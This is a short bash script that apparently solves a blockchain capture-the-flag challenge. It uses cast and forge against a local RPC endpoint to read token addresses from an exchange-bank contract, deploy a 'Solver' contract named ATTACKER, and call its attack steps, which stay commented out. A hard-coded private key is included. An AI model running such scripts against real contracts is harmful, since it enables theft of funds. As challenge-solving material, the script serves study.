#!/bin/bash

# Set up environment variables
RPC_URL="http://localhost:8000/0b03b93b842b/rpc"
EXCHANGE_BANK="0x598D6a4c9691d07434Da9171997174A2C242d4C6"
PRIVATE_KEY="0xf6724172ff851626faade595e6e40c740a382fd359d9f7cdd932e0e7ce618272"
USER_ADDRESS="0x76bA338360A72f74b2C8eEa9C86834198e7a3Dc5"

# Get token addresses
TOKEN1_ADDRESS=$(cast call --rpc-url $RPC_URL $EXCHANGE_BANK "token1()(address)")
TOKEN2_ADDRESS=$(cast call --rpc-url $RPC_URL $EXCHANGE_BANK "token2()(address)")

# Print token addresses
echo "Token1 Address: $TOKEN1_ADDRESS"
echo "Token2 Address: $TOKEN2_ADDRESS"

# Create Solver contract and capture the output
FORGE_OUTPUT=$(forge create Solver --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $EXCHANGE_BANK)

# Extract the deployed contract address
ATTACKER=$(echo "$FORGE_OUTPUT" | grep "Deployed to:" | awk '{print $3}')

# Print the ATTACKER address
echo "ATTACKER=$ATTACKER"

# cast send --rpc-url=$RPC_URL --private-key $PRIVATE_KEY $ATTACKER "step1()"
# cast call --rpc-url=$RPC_URL $TOKEN1_ADDRESS "balanceOf(address)(uint256)" $ATTACKER
# cast send --rpc-url=$RPC_URL --private-key $PRIVATE_KEY $ATTACKER "step2()"
# cast call --rpc-url=$RPC_URL $TOKEN2_ADDRESS "balanceOf(address)(uint256)" $ATTACKER
# cast send --rpc-url=$RPC_URL --private-key $PRIVATE_KEY $ATTACKER "step4()"

